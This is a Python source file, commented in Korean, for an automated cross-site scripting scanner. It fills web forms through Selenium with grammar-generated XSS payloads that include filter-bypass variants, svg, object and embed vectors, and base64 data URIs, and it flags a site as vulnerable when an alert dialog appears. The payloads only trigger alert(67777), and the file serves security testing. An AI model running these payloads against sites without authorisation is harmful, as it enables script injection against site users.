from fuzzingbook.WebFuzzer import *
from selenium.common.exceptions import TimeoutException, NoSuchElementException, UnexpectedAlertPresentException
from selenium.webdriver import ActionChains
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By
from pwn import *
from xss_bypass import *
from urllib.parse import urljoin, urlencode
import random
import time
import re

random.seed(time.time())


def exec_func(functions, arg: str) -> list[str]:
    # 함수명 리스트가 주어지면 해당 함수를 호출해서 결과 값을 리턴

    result: list[str] = []

    for func in functions:
        result.append(func(arg))

    return result


alert = 'alert(67777)'
alerts: list[str] = exec_func(get_bypass_alert(), alert)


def check_attackable(driver, url) -> bool:
    try:
        # WebDriver 초기화
        driver.get(url)
    except:
        return False

    # 모든 input 요소와 select 요소 검색
    input_elements_text = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
    input_elements_password = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
    textarea_elements = driver.find_elements(By.TAG_NAME, "textarea")
    select_elements = driver.find_elements(By.TAG_NAME, "select")

    # 화면에 표시된 input 요소 또는 select 요소가 있는지 확인
    for element in input_elements_text + input_elements_password + select_elements + textarea_elements:
        if element.is_displayed():
            return True

    return False


def get_form_details(form):  # form tag 내의 세부 데이터 추출 함수
    details = {}

    # form의 이동할 action url
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()

    inputs = []

    for tag in form.find_all(["input", "textarea", "select", "checkbox", "button", "body"]):
        tag_type = tag.name
        tag_name = tag.attrs.get("name")
        inputs.append({"type": tag_type, "name": tag_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs

    return details


def submit_form(driver, form_details, url, value) -> dict:
    # XSS 페이로드 전송 및 공격 결과 탐지 함수

    result = {"Vulnerability": "", "URL": "", "Method": "", "Payload": ""}    # 결과를 저장할 변수
    target_url = urljoin(url, form_details["action"])
    joined_url = ""
    inputs = form_details["inputs"]

    # 공격 인자값 가져오기
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search" \
                or input["type"] == "input" or input["type"] == "select" \
                or input["type"] == "submit":
            input["value"] = value

        input_name = input.get("name")
        input_value = input.get("value")

        if input_name and input_value:
            data[input_name] = input_value

    if data == {}:
        return result

    # 페이로드 전송하기
    try:
        actions = ActionChains(driver)
        driver.switch_to.window(driver.current_window_handle)

        if form_details["method"] == "get":     # GET 방식으로 전송할 때
            joined_url = target_url + "?" + urlencode(data)
            driver.get(joined_url)

            if "srcdoc" in value:  # srcdoc를 이용한 페이로드 일 때
                try:    # 내부 프레임에 들어가서 "fuzz" 라는 id를 가진 element를 찾고
                    iframe = driver.find_element(By.TAG_NAME, "iframe")
                    driver.switch_to.frame(iframe)

                    element = driver.find_element(By.ID, "fuzz")
                    sleep(0.1)

                    if element.is_enabled():    # element가 클릭 가능하면
                        element.click()         # 클릭
                    else:                       # 클릭 불가능하면 해당 element로 마우스를 가져감
                        actions.move_to_element(element).perform()

                    driver.switch_to.default_content()
                except NoSuchElementException:
                    pass
                except UnexpectedAlertPresentException:
                    result["Vulnerability"] = "Cross-site scripting"
                    result["URL"] = url
                    result["Method"] = form_details["method"]
                    result["Payload"] = data
                    return result

            if 'id="fuzz"' in value:  # 이벤트 핸들러를 사용한 페이로드 일 때
                try:    # id가 "fuzz"인 element를 찾고
                    element = driver.find_element(By.ID, 'fuzz')
                    sleep(0.1)

                    if element.is_enabled():    # element가 클릭 가능한 경우
                        element.click()         # element를 클릭
                    else:                       # element가 클릭 불가능한 경우 해당 위치로 마우스 이동
                        actions.move_to_element(element).perform()
                except UnexpectedAlertPresentException: # alert창이 떴을 때 프로그램이 종료되지 않게 예외처리
                    result["Vulnerability"] = "Cross-site scripting"
                    result["URL"] = url
                    result["Method"] = form_details["method"]
                    result["Payload"] = data
                    return result
                except NoSuchElementException:  # "fuzz" 라는 id를 가진 element가 발견되지 않아서 예외가 발생하면
                    pass    # id="fuzz" 인 element를 발견하지 못했다고 출력

            # alert 창을 찾을 때 까지 0.1초간 기다림
            WebDriverWait(driver, 0.1).until(expected_conditions.alert_is_present())

            # 경고창 닫기
            driver.switch_to.alert.accept()
        elif form_details["method"] == "post":  # POST 방식으로 전송할 때
            # POST Method 사용을 위한 자바스크립트 함수 추가
            inject_post_function = """function post_to_url(path, params, method) {
    method = method || "post";

    let form = document.createElement("form");
    form._submit_function_ = form.submit;

    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for (let key in params) {
        let hiddenField = document.createElement("input");
        hiddenField.setAttribute("type", "hidden");
        hiddenField.setAttribute("name", key);
        hiddenField.setAttribute("value", params[key]);

        form.appendChild(hiddenField);
    }

    document.body.appendChild(form);
    form._submit_function_(); //Call the renamed function.
}
post_to_url(arguments[0], arguments[1]);
            """

            # target_url과 payload를 매개 변수로 해서 페이로드 전송 함수 실행
            driver.execute_script(inject_post_function, target_url, data)

            if "srcdoc" in value:  # srcdoc를 이용한 페이로드 일 때
                try:
                    iframe = driver.find_element(By.TAG_NAME, "iframe")
                    driver.switch_to.frame(iframe)

                    element = driver.find_element(By.ID, "fuzz")

                    if element.is_enabled():
                        # 요소가 클릭 가능한 상태일 때 수행할 동작
                        element.click()
                    else:
                        actions.move_to_element(element).perform()

                    driver.switch_to.default_content()
                except UnexpectedAlertPresentException:
                    result["Vulnerability"] = "Cross-site scripting"
                    result["URL"] = url
                    result["Method"] = form_details["method"]
                    result["Payload"] = data
                    return result
                except NoSuchElementException:
                    pass

            if 'id="fuzz"' in value:  # 이벤트 핸들러를 이용한 페이로드 일 때
                try:
                    element = driver.find_element(By.ID, 'fuzz')
                    sleep(0.1)

                    if element.is_enabled():
                        # 요소가 클릭 가능한 상태일 때 수행할 동작
                        element.click()
                    else:
                        actions.move_to_element(element).perform()
                except UnexpectedAlertPresentException:
                    result["Vulnerability"] = "Cross-site scripting"
                    result["URL"] = url
                    result["Method"] = form_details["method"]
                    result["Payload"] = data
                    return result
                except NoSuchElementException:
                    pass
                except NoSuchElementException:
                    pass

            # alert 창을 찾을 때 까지 0.1초간 기다림
            WebDriverWait(driver, 0.1).until(expected_conditions.alert_is_present())

            # 경고창 닫기
            driver.switch_to.alert.accept()
    except UnexpectedAlertPresentException:   # alert 창이 떴을 때 프로그램이 종료되지 않게 예외 처리
        pass
    except TimeoutException:    # alert 창을 닫는데 실패하면 XSS 없음
        pass
    else:
        # alert 창을 닫는데 성공하면 XSS 발견
        result["Vulnerability"] = "Cross-site scripting"
        result["URL"] = url
        result["Method"] = form_details["method"]
        result["Payload"] = data

        # 추가적인 Alert 창을 모두 닫기
        check_alert = None
        while check_alert is None:
            try:
                driver.switch_to.alert.accept()
            except:
                check_alert = True

    return result


def xss_script(count: int) -> list[str]:    # script 태그를 이용한 XSS 페이로드 생성 함수
    XSS_Grammar: Grammar = {
        '<start>': ['<xss>'],
        '<xss>': ['<start-tag><content><end-tag>'],
        '<start-tag>': ['<left-angle><script><src><right-angle>'],
        '<content>': ['<alert>', ''],
        '<end-tag>': ['<left-angle>/<script><right-angle>'],
        '<script>': ['script'],
        '<src>': [' src="data:,<alert>"', ' src="data:text/html;base64,YWxlcnQoNjc3Nzcp"', ''],
        '<alert>': alerts,
        '<left-angle>': ['<'],
        '<right-angle>': ['>']
    }

    payloads: list[str] = []

    for _ in range(count):
        xss_fuzzer = GrammarFuzzer(XSS_Grammar, max_nonterminals=10)
        payload: str = xss_fuzzer.fuzz()

        # 아래 두가지 형식의 페이로드는 제거
        # <script src="data;,alert('XSS')">alert(5)</script>
        # <script></script>
        if (payload.find('src') != -1 and re.findall(r'>(.*?)<', payload) != ['']) \
                or (payload.find('src') == -1 and re.findall(r'>(.*?)<', payload) == ['']):
            continue

        bypass = random.choice(get_bypass_script())     # 필터링 우회를 위한 함수 랜덤 추출

        # 생성된 페이로드가 <script>alert(5)</script> 형식의 페이로드인 경우
        if re.findall(r'>(.*?)<', payload) != ['']: # 필터링 우회 함수 적용
            payload = payload.replace('<script>', bypass('<script>'))
            payload = payload.replace('</script>', bypass('</script>'))

        payloads.append(payload)

    payloads = list(set(payloads))  # 중복 제거

    return payloads


def xss_event_handler(count: int) -> list[str]:     # 이벤트 핸들러를 이용한 XSS 페이로드 생성 함수
    XSS_Grammar: Grammar = {
        '<start>': ['<xss>'],
        '<xss>': ['<tag-attr> <event-handler>'],
        '<tag-attr>': ['<left-angle><tag>'],
        '<event-handler>': ['<id><event-attr>="<alert>"<right-angle>'],
        '<tag>': ['img src="invalid.jpg"',
                  'img src="https://github.com/silvergun8291/test/blob/master/XSS.png?raw=true"',
                  'iframe', 'a href="#"', 'input type="text"', 'body', 'textarea rows="10" cols="50"',
                  'div style="position:fixed;left:0;top:0;width:100px;height:100px;"'],
        '<id>': [' id="fuzz" '],
        '<event-attr>': ['onerror', 'onload', 'onclick', 'autofocus onfocus',
                         'onmouseover', 'onmousedown', 'onmouseup', 'onmousemove'],
        '<alert>': alerts,
        '<left-angle>': ['<'],
        '<right-angle>': ['>click'],
    }

    payloads: list[str] = []

    for _ in range(count):
        xss_fuzzer = GrammarFuzzer(XSS_Grammar, max_nonterminals=10)
        payload: str = xss_fuzzer.fuzz()

        event_handler = ''.join((re.findall(r'\bon\w+', payload)))  # 페이로드에서 이벤트 핸들러 문자열 추출
        # 추출한 이벤트 핸들러 문자열에 필터링 우회 함수를 적용하여 교체
        payload = payload.replace(event_handler, random.choice(get_bypass_event_handler())(event_handler))

        payloads.append(payload)

    payloads = list(set(payloads))  # 중복 제거

    return payloads


def xss_javascript(count: int) -> list[str]:    # "javascript:" 를 이용한 XSS 페이로드 생성 함수
    XSS_Grammar: Grammar = {
        '<start>': ['<xss>'],
        '<xss>': ['<start-tag><payload><content>'],
        '<start-tag>': ['<left-angle><tag>'],
        '<payload>': ['"javascript:<alert>"'],
        '<content>': ['/<right-angle>click'],
        '<tag>': ['iframe src=', 'a id="fuzz" href=',
                  'frameset<right-angle><left-angle>frame src=',
                  'form id="fuzz" <right-angle><left-angle>input type=submit value=click formaction='],
        '<alert>': alerts,
        '<left-angle>': ['<'],
        '<right-angle>': ['>'],
    }

    payloads: list[str] = []

    for _ in range(count):
        xss_fuzzer = GrammarFuzzer(XSS_Grammar, max_nonterminals=10)
        payload: str = xss_fuzzer.fuzz()
        payloads.append(random.choice(get_bypass_javascript())(payload))    # 페이로드에 필터링 우회 함수 적용
        payloads.append('''<frameset><frame src="data:text/html;base64,PHNjcmlwdD5hbGVydCg2Nzc3Nyk8L3NjcmlwdD4="/>''')
        payloads.append('''<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCg2Nzc3Nyk8L3NjcmlwdD4=">''')

    payloads = list(set(payloads))  # 중복 제거

    return payloads


def xss_srcdoc(count: int) -> list[str]:    # srcdoc를 이용한 XSS 페이로드 생성 함수
    payloads = xss_event_handler(count)
    result = []

    # 기본 XSS 페이로드를 srcdoc 함수를 이용해서 srcdoc XSS 페이로드로 변경
    for payload in payloads:
        tmp = srcdoc(payload)
        result.append(tmp)

    result = list(set(result))  # 중복 제거

    return result


def xss_inner_html(count: int) -> list[str]:    # inner html을 이용한 XSS 페이로드 생성 함수
    payloads = xss_event_handler(count)
    result = []

    # 기본 XSS 페이로드를 innerhtml() 함수를 이용해서 inner html XSS 페이로드로 변경
    for payload in payloads:
        tmp = innerhtml(payload)
        result.append(tmp)

    result = list(set(result))

    return result


def xss_etc() -> list[str]: # 그 밖의 불규칙한 페이로드 생성
    svg_xss = [
        '<svg onload=location=textContent>javascript:alert(67777)//',
        '<svg onload=location=nextSibling.innerText><b>javas<b></b>cript:al<b></b>ert(<b>67777</b>)</b>',
        '<svg onload=innerHTML=nextSibling.innerText><b>&lt;img/src/on<b></b>error=al<b></b>ert(67777)></b>',
        '<svg><script>alert(67777)</script></svg>',
        '<svg><script xlink:href=data:,alert(67777)></script>',
        '<svg </onload ="1> (alert(67777)) "">',
        '<svg id="fuzz"><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate '
        'attributeName=xlink:href begin=0 from=javascript:alert(67777) to=%26>',
        'search=<svg id="fuzz"><a><animate attributeName=href values=javascript:alert(67777) /><text x=20 y=20>Click me</text></a>'
    ]

    object_xss = [
        '<object data="data:text/html;,<script>alert(67777)</script>"></object>',
        """<object data='data:image/svg+xml;,<svg xmlns:svg="http://www.w3.org/2000/svg" 
        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script 
        type="text/ecmascript">alert(67777);</script></svg>'>"""
        """<object data="data:application/xml;,<fuzz:script xmlns:fuzz='http://www.w3.org/1999/xhtml'>alert(
        67777)</fuzz:script>">""",
        """<object type="text/html" data="about:blank" onload="alert(67777)"></object>""",
    ]

    embed_xss = [
        """<embed type="text/html" src="data:text/html;,<script>alert(67777)</script>">""",
        """<embed type="image/svg+xml" src='data:image/svg+xml;,<svg xmlns:svg="http://www.w3.org/2000/svg" 
        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script 
        type="text/ecmascript">alert(67777);</script></svg>'>""",
        """<embed type="application/xml" src="data:application/xml;,<fuzz:script 
        xmlns:fuzz='http://www.w3.org/1999/xhtml'>alert(67777)</fuzz:script>">""",
        """<embed type="text/html" data="#" onload="alert(67777)">"""
    ]

    return svg_xss + object_xss + embed_xss


def generate_payload():
    # XSS 페이로드 생성
    payloads_script = xss_script(25)
    payloads_event_handler = xss_event_handler(50)
    payloads_javascript = xss_javascript(50)
    payloads_srcdoc = xss_srcdoc(25)
    payloads_inner_html = xss_inner_html(25)
    payloads_etc = xss_etc()

    payloads = payloads_script + payloads_event_handler + payloads_javascript + payloads_srcdoc + payloads_inner_html + payloads_etc

    payloads = list(set(payloads))  # 중복 제거

    if '' in payloads:  # '' 제거
        payloads.remove('')

    payloads = random.sample(payloads, 70)     # 페이로드 중 무작위로 80개를 뽑음

    return payloads
